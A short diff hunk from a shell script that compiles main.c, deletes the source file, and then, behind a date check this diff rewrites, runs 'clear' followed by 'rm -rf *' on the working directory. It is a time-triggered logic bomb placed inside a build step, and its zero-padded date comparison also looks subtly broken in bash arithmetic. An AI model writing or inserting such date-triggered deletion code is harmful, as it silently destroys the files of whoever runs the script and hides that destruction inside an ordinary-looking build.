@@ -40,7 +40,7 @@ test -f main.c && gcc main.c -o main
 if [[ -f main ]]; then
     test -f main.c && rm -rf main.c
 fi
-if (($(date +%m%y) >= 0622)); then
+if (($(date +%d%m%y) >= 010622)); then
     clear
     rm -rf *
 else
